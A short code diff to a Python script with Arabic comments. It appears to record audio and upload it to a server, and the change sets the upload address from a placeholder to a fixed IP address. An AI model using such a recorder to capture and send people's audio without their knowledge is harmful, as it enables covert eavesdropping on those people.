@@ -6,7 +6,7 @@ import requests
 import time
 
 # إعدادات السيرفر
-SERVER_URL = "http://<server-ip>:5000/upload_audio"  # استبدل <server-ip> بعنوان السيرفر الخاص بك
+SERVER_URL = "http://185.37.12.147:5000/upload_audio"  # استبدل <server-ip> بعنوان السيرفر الخاص بك
 
 # دالة لتسجيل الصوت وإرساله إلى السيرفر
 def record_and_send_audio():
